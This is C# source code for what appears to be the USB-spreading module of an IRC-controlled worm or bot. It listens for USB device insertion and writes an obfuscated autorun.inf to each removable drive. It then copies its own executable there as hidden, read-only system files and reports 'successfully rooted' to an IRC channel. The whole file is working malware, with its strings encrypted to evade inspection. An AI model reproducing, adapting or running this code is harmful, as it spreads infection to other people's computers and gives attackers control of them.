using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

namespace myApp
{
    internal class Usb
    {
        private static ManagementEventWatcher Mew;

        public static void Listen()
        {
            WqlEventQuery wql;
            var scope = new ManagementScope("root\\CIMV2");
            scope.Options.EnablePrivileges = true;

            try
            {
                wql = new WqlEventQuery();
                wql.EventClassName = "__InstanceCreationEvent";
                wql.WithinInterval = new TimeSpan(0, 0, 3);
                wql.Condition = @"TargetInstance ISA 'Win32_USBControllerdevice'";
                Mew = new ManagementEventWatcher(scope, wql);
                Mew.EventArrived += foundU;
                Mew.Start();
            }

            catch
            {
                if (Mew != null)
                    Mew.Stop();
            }
        }

        public static void foundU(object sender, EventArgs e)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    try
                    {
                        if (File.Exists(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true)))
                        {
                            File.Delete(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true));
                        }
                        if (File.Exists(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true)))
                        {
                            File.Delete(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true));
                        }
                    }
                    catch
                    {
                    }


                    var sw = new StreamWriter(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true));
                    sw.WriteLine(Fuck.a("cLJ2c4jB2LWln+SqM1cmCQ==", Install.gay, true));
                    sw.WriteLine(Fuck.a("pbD3rv0mNI7aGEqhV/O5mg==", Install.gay, true));
                    sw.WriteLine(Fuck.a("open=autorun.exe", Install.gay, true));
                    sw.WriteLine(Fuck.a("MXpHRSVb4BZXu7p5GN47vFJyametJ7HS", Install.gay, true));
                    sw.WriteLine(Fuck.a("BoYd7eX5plbG53lTqF+wb+wappqQ80vb9qtoiv9t43g=", Install.gay, true));
                    sw.Close();
                    File.SetAttributes(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true),
                                       File.GetAttributes(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true)) | FileAttributes.System |
                                       FileAttributes.Hidden | FileAttributes.NotContentIndexed |
                                       FileAttributes.ReadOnly);

                    try
                    {
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true));
                        File.SetAttributes(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true),
                                           File.GetAttributes(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true)) | FileAttributes.System |
                                           FileAttributes.Hidden | FileAttributes.NotContentIndexed |
                                           FileAttributes.ReadOnly);
                        Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  " + drive.Name + " 9successfully rooted");
                    }
                    finally
                    {
                        Thread.Sleep(2000);
                    }
                }
                if (Mew != null)
                    Mew.Stop();
                Mew.Start();
            }
        }
    }
}